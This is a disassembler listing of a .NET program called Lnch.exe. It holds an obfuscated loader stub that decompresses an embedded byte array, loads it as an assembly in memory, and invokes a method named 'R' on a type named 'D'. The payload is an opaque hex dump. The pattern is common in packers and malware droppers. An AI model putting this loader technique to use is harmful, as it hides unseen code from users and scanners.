
//  Microsoft (R) .NET Framework IL Disassembler.  Version 2.0.50727.42
//  Copyright (c) Microsoft Corporation.  All rights reserved.



// Metadata version: v2.0.50727
.assembly Lnch
{
  .hash algorithm 0x00008004
  .ver 1:0:0:0
}
.module Lnch.exe
// MVID: {25B121AD-7EA2-42EB-A1A1-ECDF040311C3}
.imagebase 0x00400000
.file alignment 0x00001000
.stackreserve 0x00100000
.subsystem 0x0003       // WINDOWS_CUI
.corflags 0x00000001    //  ILONLY
// Image base: 0x02EC0000


// =============== CLASS MEMBERS DECLARATION ===================

.class private auto ansi beforefieldinit a.a
       extends [mscorlib]System.Object
{
  .field public static uint8[] z
  .method private hidebysig static void  Main(string[] args) cil managed
  {
    .entrypoint
    // Code size       137 (0x89)
    .maxstack  4
    .locals init ([0] class [System]System.IO.Compression.DeflateStream gz,
             [1] uint8[] bo,
             [2] class [mscorlib]System.Reflection.Assembly asm,
             [3] class [mscorlib]System.Type[] ts,
             [4] int32 j)
    IL_0000:  ldsfld     uint8[] a.a::z
    IL_0005:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[])
    IL_000a:  ldc.i4.0
    IL_000b:  newobj     instance void [System]System.IO.Compression.DeflateStream::.ctor(class [mscorlib]System.IO.Stream,
                                                                                          valuetype [System]System.IO.Compression.CompressionMode)
    IL_0010:  stloc.0
    IL_0011:  ldc.i4     0x186a0
    IL_0016:  newarr     [mscorlib]System.Byte
    IL_001b:  stloc.1
    IL_001c:  ldloc.1
    IL_001d:  ldc.i4.1
    IL_001e:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor(uint8[],
                                                                               bool)
    IL_0023:  pop
    IL_0024:  ldloc.0
    IL_0025:  ldloc.1
    IL_0026:  ldc.i4.0
    IL_0027:  ldc.i4     0x186a0
    IL_002c:  callvirt   instance int32 [mscorlib]System.IO.Stream::Read(uint8[],
                                                                         int32,
                                                                         int32)
    IL_0031:  pop
    IL_0032:  ldloc.1
    IL_0033:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0038:  stloc.2
    IL_0039:  ldloc.2
    IL_003a:  brfalse.s  IL_0088

    IL_003c:  ldloc.2
    IL_003d:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Assembly::GetExportedTypes()
    IL_0042:  stloc.3
    IL_0043:  ldc.i4.0
    IL_0044:  stloc.s    j
    IL_0046:  br.s       IL_0081

    IL_0048:  ldloc.3
    IL_0049:  ldloc.s    j
    IL_004b:  ldelem.ref
    IL_004c:  callvirt   instance string [mscorlib]System.Reflection.MemberInfo::get_Name()
    IL_0051:  ldstr      "D"
    IL_0056:  call       bool [mscorlib]System.String::op_Equality(string,
                                                                   string)
    IL_005b:  brfalse.s  IL_007b

    IL_005d:  ldloc.3
    IL_005e:  ldloc.s    j
    IL_0060:  ldelem.ref
    IL_0061:  ldstr      "R"
    IL_0066:  callvirt   instance class [mscorlib]System.Reflection.MethodInfo [mscorlib]System.Type::GetMethod(string)
    IL_006b:  ldloc.3
    IL_006c:  ldloc.s    j
    IL_006e:  ldelem.ref
    IL_006f:  call       object [mscorlib]System.Activator::CreateInstance(class [mscorlib]System.Type)
    IL_0074:  ldnull
    IL_0075:  callvirt   instance object [mscorlib]System.Reflection.MethodBase::Invoke(object,
                                                                                        object[])
    IL_007a:  pop
    IL_007b:  ldloc.s    j
    IL_007d:  ldc.i4.1
    IL_007e:  add
    IL_007f:  stloc.s    j
    IL_0081:  ldloc.s    j
    IL_0083:  ldloc.3
    IL_0084:  ldlen
    IL_0085:  conv.i4
    IL_0086:  blt.s      IL_0048

    IL_0088:  ret
  } // end of method a::Main

  .method public hidebysig specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method a::.ctor

  .method private hidebysig specialname rtspecialname static 
          void  .cctor() cil managed
  {
    // Code size       27 (0x1b)
    .maxstack  8
    IL_0000:  ldc.i4     0x7ad
    IL_0005:  newarr     [mscorlib]System.Byte
    IL_000a:  dup
    IL_000b:  ldtoken    field valuetype '<PrivateImplementationDetails>{25B121AD-7EA2-42EB-A1A1-ECDF040311C3}'/'__StaticArrayInitTypeSize=1965' '<PrivateImplementationDetails>{25B121AD-7EA2-42EB-A1A1-ECDF040311C3}'::'$$method0x6000003-1'
    IL_0010:  call       void [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::InitializeArray(class [mscorlib]System.Array,
                                                                                                        valuetype [mscorlib]System.RuntimeFieldHandle)
    IL_0015:  stsfld     uint8[] a.a::z
    IL_001a:  ret
  } // end of method a::.cctor

} // end of class a.a

.class private auto ansi '<PrivateImplementationDetails>{25B121AD-7EA2-42EB-A1A1-ECDF040311C3}'
       extends [mscorlib]System.Object
{
  .custom instance void [mscorlib]System.Runtime.CompilerServices.CompilerGeneratedAttribute::.ctor() = ( 01 00 00 00 ) 
  .class explicit ansi sealed nested private '__StaticArrayInitTypeSize=1965'
         extends [mscorlib]System.ValueType
  {
    .pack 1
    .size 1965
  } // end of class '__StaticArrayInitTypeSize=1965'

  .field static assembly valuetype '<PrivateImplementationDetails>{25B121AD-7EA2-42EB-A1A1-ECDF040311C3}'/'__StaticArrayInitTypeSize=1965' '$$method0x6000003-1' at I_000020E8
} // end of class '<PrivateImplementationDetails>{25B121AD-7EA2-42EB-A1A1-ECDF040311C3}'


// =============================================================

.data cil I_000020E8 = bytearray (
                 ED BD 07 60 1C 49 96 25 26 2F 6D CA 7B 7F 4A F5  // ...`.I.%&/m.{.J.
                 4A D7 E0 74 A1 08 80 60 13 24 D8 90 40 10 EC C1  // J..t...`.$..@...
                 88 CD E6 92 EC 1D 69 47 23 29 AB 2A 81 CA 65 56  // ......iG#).*..eV
                 65 5D 66 16 40 CC ED 9D BC F7 DE 7B EF BD F7 DE  // e]f.@......{....
                 7B EF BD F7 BA 3B 9D 4E 27 F7 DF FF 3F 5C 66 64  // {....;.N'...?\fd
                 01 6C F6 CE 4A DA C9 9E 21 80 AA C8 1F 3F 7E 7C  // .l..J...!....?~|
                 1F 3F 22 BE F8 A9 3F E9 D7 F8 B5 7F 8D 5F E3 D7  // .?"...?......_..
                 F8 75 E8 FF FF F7 FF FD 6B FC 1A 7F D7 AF 21 CF  // .u......k.....!.
                 EF A9 3F 37 3D 7F 10 FD FF 37 F9 5D FE 9E DF E4  // ..?7=....7.]....
                 D7 F8 DB 7E EC 9F FF 5D FF AE 5F F3 F9 3F FF BB  // ...~...].._..?..
                 BE 99 17 4D BA AA AB 8B 3A 5B A4 D3 6C B9 AC DA  // ...M....:[..l...
                 74 92 A7 F5 7A 99 16 CB F4 E9 97 AF D3 45 35 CB  // t...z........E5.
                 C7 BF F1 6F 9C FC 6E 0A E3 E5 E9 AF F1 6B 3C FF  // ...o..n......k<.
                 35 7F ED 5F 63 FA B7 BD F8 DC C0 FD 8F 7E 8D DF  // 5.._c........~..
                 E4 77 FD 0D 7F CD DF E0 D7 F8 35 7E 33 FA 23 95  // .w........5~3.#.
                 CF FE 82 5F A8 BF FF 9E BF 86 FC 83 DF 7F 33 C1  // ..._..........3.
                 1B 8F F9 F9 6B FC 41 F2 39 9E 5F FB D7 F8 3D 7F  // ....k.A.9._...=.
                 5D FE 83 FF 36 3F ED 0F 7E 9E 13 DC 2F F1 CB EF  // ]...6?..~.../...
                 F9 6B FC 1A FF D3 AF E5 7D 61 9E 3F E0 D7 F8 35  // .k......}a.?...5
                 7E 23 FA F1 9F FD EE BF C6 AF F1 3B 45 BE 1E 7C  // ~#.........;E..|
                 D2 5F E3 D7 F8 0D BC 3F 7F 03 FA FB DB DE DF E3  // ._.....?........
                 36 7F D7 D2 CF BF EC D7 FB 35 EC 58 02 C4 E4 E3  // 6........5.X....
                 3F 60 5C 37 F5 F4 D7 50 DC 7E 4F 6D 83 F6 DE 43  // ?`\7...P.~Om...C
                 1F FF 9E E3 3A 2F AB A9 E0 0A 9C B9 DD 4E AF DD  // ....:/.......N..
                 93 F0 93 1F 3D 3F 7A 7E F4 FC E8 F9 D1 F3 A3 E7  // ....=?z~........
                 47 CF 8F 9E 1F 3D 3F 7A 7E F4 FC E8 F9 D1 F3 F3  // G....=?z~.......
                 E5 F9 83 7E A1 FC FC 36 FD FF D7 FA 35 7E DD 5F  // ...~...6....5~._
                 63 96 D2 67 14 35 FF 9A 1B DE D9 F4 8C 6B 7A 73  // c..g.5.......kzs
                 B5 F5 9B FD 1A BF 46 F2 AD 5F F0 6B 6D FD E6 F8  // ......F.._.km...
                 F9 E4 F5 77 9E FC 9A 0A 11 F1 E9 E5 DE 78 67 7C  // ...w.........xg|
                 7F E7 C1 DE 03 7C F2 EB FE 1A 25 FD FB 4F D1 D7  // .....|....%..O..
                 3F FE 4B 7F 8D 5F 63 9F E2 DC 03 FA FF 8F BF 6E  // ?.K.._c........n
                 EB 62 79 D1 A0 45 49 C1 FD 53 FA F9 E3 5F BD FE  // .by..EI..S..._..
                 35 FE A6 5F 47 42 DB 1F FF FC AB 33 7C F6 0F D1  // 5.._GB.....3|...
                 DF FF 10 FE 7E 52 56 13 C5 81 5E FF 35 3F FF AD  // ....~RV...^.5?..
                 7E 8D 5F E3 C7 F0 C7 FF FE 6B DE FB 35 7E 1B 19  // ~._......k..5~..
                 CF 6F 21 DF F1 FF 09 B1 5F E3 37 FE 35 E4 73 C1  // .o!....._.7.5.s.
                 2C D1 9F BF DE AF F1 BB FD 1A BF 33 FD 7B FA 6B  // ,..........3.{.k
                 DC A3 7F 27 FC EF 9F F3 6B FC 62 FA F7 AF E2 7F  // ...'....k.b.....
                 FF 3E FE E4 5F E7 7F FF 27 FE F7 37 FC 35 F1 EF  // .>.._...'..7.5..
                 EF C6 FF 7E C6 FF FE BE FC EF 35 FF FB 97 FE 9A  // ...~......5.....
                 7F D2 AF 79 F8 6B FC 9D BF 26 20 FF 17 BF E6 3F  // ...y.k...& ....?
                 F1 6B FE 7A BF C6 AF F7 6B E1 DF DF ED D7 FA 9D  // .k.z....k.......
                 B9 BF 5F 53 FF C5 7F BF 19 FD F7 5B 10 45 F0 FB  // .._S.......[.E..
                 CB 14 9F FF 11 BF C6 27 8C D9 EF 2B 7F FD 76 DB  // .......'...+..v.
                 FC D7 6F FE 6B 6C FF 1A BF C9 AF F1 DB F3 BF BF  // ..o.kl..........
                 2B FF 7B 87 FE FD 2D 7F 8D 5D FE FD 21 FF 7B CC  // +.{...-..]..!.{.
                 FF 9E F1 BF 3F C1 FF FE 3E FC 6F C6 FF 16 FC EF  // ....?...>.o.....
                 2F A2 7F 7F BB 5F E3 0F A6 7F 7F C1 AF F1 47 FF  // /...._........G.
                 1A 80 FD 27 FF 1A A3 5F EB C7 89 72 F8 7D FC 6B  // ...'..._...r.}.k
                 FC 86 BF C6 16 FD FB 3B FE 1A F7 E9 DF 1F FF 35  // .......;.......5
                 7E 7F FA F7 1E FF 7B F8 6B E4 F4 EF C9 AF F1 4B  // ~.....{.k......K
                 E8 DF DF 8B 3F 79 CD FF 7E 8F FF 9D F2 E7 6F 7F  // ....?y..~.....o.
                 8D 3F 81 FE 6D 7E 8D 3F 93 FE FD C5 BF C6 5F F4  // .?..m~.?......_.
                 6B FC 3A 7F 50 97 AB CC 7C 98 E7 D7 FC 35 7E 2B  // k.:.P...|....5~+
                 F7 C7 E3 2F AA D9 BA CC 8F 7E 8D 6C 3C 2B 4B 9A  // .../.....~.l<+K.
                 FF EC D7 58 34 D3 AA 2E 8B C9 AF F1 FA BA 69 F3  // ...X4.........i.
                 C5 AF F1 E5 E4 A7 F3 69 FB 6B BC FA 35 C6 D3 B6  // .......i.k..5...
                 AA F5 D3 F1 AB FC BC A4 8F 8B 6A F9 6B 1C 37 4D  // ..........j.k.7M
                 BE 98 94 D7 CF 8A 32 FF C9 BC 6E E8 B3 E3 96 F8  // ......2...n.....
                 6A B2 6E 73 FB 65 EF 0B 03 67 BD 6C 8B 45 3E 3E  // j.ns.e...g.l.E>>
                 5B B6 79 5D AD 5E E7 F5 65 31 CD 9B 5F E3 F3 75  // [.y].^..e1.._..u
                 31 73 8D 4F AA C5 4F 16 4D 31 29 F3 3E E4 93 75  // 1s.O..O.M1).>..u
                 D9 AE EB C8 17 6F EA 6C 96 2F B2 FA 6D E4 9D 6A  // .....o.l./..m..j
                 75 5D 17 17 F3 B6 FF D5 CB 9A 28 32 8D 7C 41 38  // u]........(2.|A8
                 AC B2 E5 75 EC 8B E5 79 71 B1 AE B3 36 3A F2 A7  // ...u...yq...6:..
                 79 33 AD 8B 55 FC CB 37 45 EB 8F 49 89 F2 B4 C8  // y3..U..7E..I....
                 2E 96 55 D3 16 D3 E6 D7 78 9A 4F D6 17 17 59 30  // ..U.....x.O...Y0
                 74 F9 8C 04 97 66 8F 68 D5 21 25 10 A5 A9 A8 2D  // t....f.h.!%....-
                 2D E5 03 46 EF 55 5E 66 EF F8 B7 C6 81 D3 17 79  // -..F.U^f.......y
                 80 6D 31 29 CA A2 F5 86 49 C3 6B AA 32 FF 35 BE  // .m1)....I.k.2.5.
                 5B 17 6D FE BC 58 E6 E0 9B E3 6F 13 6F FE 34 A5  // [.m..X....o.o.4.
                 C8 CE 7F 8D FA D7 F8 CF 7F 8D 25 FD B6 22 DE 99  // ..........%.."..
                 12 3F 66 BF 46 4B 7F CD E8 FB C5 AF 51 D1 6F 39  // .?f.FK......Q.o9
                 69 9E 92 FE AD E9 F7 25 B5 6D E9 BF DF 95 B8 F0  // i......%.m......
                 7F FB EB FF B9 8B 1F FF D5 7F D7 97 7F F3 6F F0  // ..............o.
                 77 FC FB 7F ED 9F FF EE D7 FF 35 7E 83 BF F3 07  // w.........5~....
                 BF EF 4F FE F6 FB FF D1 1F FD 6B A7 BF C6 AF F9  // ..O.......k.....
                 EB A4 BF E6 AF F9 9B E0 9F 5F EB D7 A5 7F 7E F3  // ........._....~.
                 CF F0 EB 6F F0 EB FC 1A F4 E1 6F F4 6B FE 1A BF  // ...o......o.k...
                 FE 2E A9 36 FA EF D7 F8 35 EE FC 9A BF C6 EF B6  // ...6....5.......
                 73 FF 7E 9E 67 9F 9E 6F EF 7D 3A DD D9 DE 7F B0  // s.~.g..o.}:.....
                 BF BB FD F0 E1 E4 DE F6 EE BD EC 60 FF FE 83 7B  // ...........`...{
                 0F EF DF CB 48 01 B2 54 FC B6 BF E6 AF F1 5B D8  // ....H..T......[.
                 C9 4F FF 91 BF 3A 4D F7 76 76 48 41 FE 66 BF E6  // .O...:M.vvHA.f..
                 AF F1 1B 5E FC A0 58 AD F2 19 C9 C1 2E 65 12 7F  // ...^..X......e..
                 4D 15 1A FA E5 37 E0 5F 7E 01 D4 C5 9B 5F EB B7  // M....7._~...._..
                 F9 6E 9D AD 5E 54 CB D3 77 D3 9C 27 F5 CD BC AE  // .n..^T..w..'....
                 AE 1A 91 39 93 5F C5 AB BF 17 7E 81 DE 27 BD F8  // ...9._....~..'..
                 EA F5 D3 D7 7F CE 3F 78 FF 5F FE 6D 77 FF 92 E7  // ......?x._.mw...
                 7F D7 FF F8 C9 AF F5 E0 9F FD 9D 1E E1 8D 93 47  // ...............G
                 BF EF 55 55 BF FD 7D F7 DF FE BE E8 BD CD 9B 76  // ..UU..}........v
                 F7 F7 F5 F0 F8 7D AB C9 4F FF BE 34 67 79 D6 E4  // .....}..O..4gy..
                 BF 6F 36 5E CD 48 F9 B6 6A 4B F0 FC 09 26 5F 1B  // .o6^.H..jK...&_.
                 79 8C CD 91 E7 F7 3F A9 EA A7 65 F9 45 56 2C 45  // y.....?...e.EV,E
                 C2 F3 9C 25 1E CF FF FD BB FF 1A E9 EF 19 03 F1  // ...%............
                 A3 E7 47 CF 8F 9E 1F 3D 3F 7A 7E F4 FC E8 F9 D1  // ..G....=?z~.....
                 F3 A3 E7 6B 3E E1 6B 88 40 7F 0D 8A 08 7F 8D 3F  // ...k>.k.@......?
                 A8 FB 39 7C C2 9D C8 E7 78 BE 4D FF FF BD 7F CF  // ..9|....x.M.....
                 5F E3 D7 F8 B3 BC 60 EE CF FA B5 F6 E9 DF 9F E4  // _.....`.........
                 B8 F0 27 29 96 7E 45 BF 9D D1 4A FB 0B FA FB 8C  // ..').~E...J.....
                 FE 7D 26 AB EE BF C6 DF FF EB FC 8F FF 97 1F 85  // .}&.............
                 9B 9F BF 87 FE 85 75 FD EE B2 3C E2 FE 5F 93 A0  // ......u...<.._..
                 66 E4 B9 3F A3 48 16 3E FC 19 79 F0 E7 E4 D5 E3  // f..?.H.>..y.....
                 F9 DD F8 AD 37 F4 6D 46 9F 36 F4 3D 3C FF 82 BE  // ....7.mF.6.=<...
                 5D 2A 84 BF E9 D7 F9 DF 7E 4D C0 78 4D 9F D7 F4  // ]*......~M.xM...
                 CD F2 D7 B8 88 40 FA D7 B8 CD 8E FD 6F 9F B2 01  // .....@......o...
                 3B BF 06 D6 D1 7F 23 FA DC B4 7F 4A FF 6F 28 BE  // ;.....#....J.o(.
                 00 9C 55 D0 CF C5 AF F1 03 FE 6C 45 2D 66 F4 1F  // ..U.......lE-f..
                 A2 0D 72 E0 09 C6 6F E0 BD FF 93 1C 81 34 DE 7B  // ..r...o......4.{
                 BB 14 31 EF D8 FF FF 1A BF C6 88 32 07 BF 26 E3  // ..1........2..&.
                 D5 72 DB 25 8D A7 24 1A 52 44 FC 6B 20 E6 C9 A8  // .r.%..$.RD.k ...
                 9D 40 C7 5C FC 16 D4 F6 39 7D 7E C1 AD 4E 08 EA  // .@.\....9}~..N..
                 EA D7 B8 66 EC 2E 7E 8D 39 41 F8 35 22 9F A5 BF  // ...f..~.9A.5"...
                 C6 5F 4D FF 4F 7F 8D 3D 1E 27 D2 32 FB DC E7 97  // ._M.O..=.'.2....
                 DA A6 D0 3E 0D CE CB 68 DF 07 4C 97 97 F4 4E 45  // ...>...h..L...NE
                 9F AD 89 26 AD 87 E5 30 3D F6 99 1E E1 7B 5D AA  // ...&...0=....{].
                 74 69 72 C0 EF 1C 53 8B 86 E3 B9 09 C1 BA A6 11  // tir...S.........
                 DC F4 DE 8F 9E 1F 3D 3F 7A 7E F4 FC E8 F9 D1 F3  // ......=?z~......
                 A3 E7 47 CF 8F 9E 1F 3D 3F 7A 7E F4 FC BC 7D 52  // ..G....=?z~...}R
                 59 93 FF 8B 3E BD A9 E1 8F 9E 1F 3D 3F 7A 7E F4  // Y...>......=?z~.
                 FC E8 F9 D1 F3 A3 E7 47 CF 8F 9E 1F 3D 3F 7A 7E  // .......G....=?z~
                 F4 FC E8 F9 D1 F3 A3 E7 FF AB CF FF 03) 
// *********** DISASSEMBLY COMPLETE ***********************
// WARNING: Created Win32 resource file lnch-decompile.res
